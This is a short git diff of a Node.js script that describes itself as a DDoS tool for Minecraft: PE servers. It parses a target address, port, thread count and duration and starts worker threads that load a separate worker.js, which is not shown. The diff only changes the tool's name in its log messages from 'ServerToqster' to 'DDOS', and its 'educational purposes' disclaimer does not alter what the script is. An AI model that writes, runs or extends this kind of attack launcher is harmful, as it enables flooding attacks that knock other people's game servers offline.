@@ -1,6 +1,6 @@
 const { Worker } = require('worker_threads');
 
-console.log(`ServerToqster script for ddosing Minecraft: PE Servers just to inform you this is for educational purposes, use it in your own risk!`)
+console.log(`DDOS script for ddosing Minecraft: PE Servers just to inform you this is for educational purposes,  use it in your own risk, `)
 
 const [node, dir, address, port, threads = 4, time = 999999999999999999999999999999999999999999999999999999999999999999999999999] = process.argv;
 
@@ -9,7 +9,7 @@ if (!address || !port) {
 }
 
 for (let i = 0; i < threads; i++) {
-  console.log(`[ServerServerToqster] Starting thread #${i}...`)
+  console.log(`[ServerDDOS] Starting thread #${i}...`)
 
   const worker = new Worker('./worker.js');
   worker.postMessage({
@@ -20,4 +20,4 @@ for (let i = 0; i < threads; i++) {
   });
 }
 
-console.log("[ServerToqster] Toasting the server in 3 seconds...")
+console.log("[DDOS] Toasting the server in 3 seconds...")
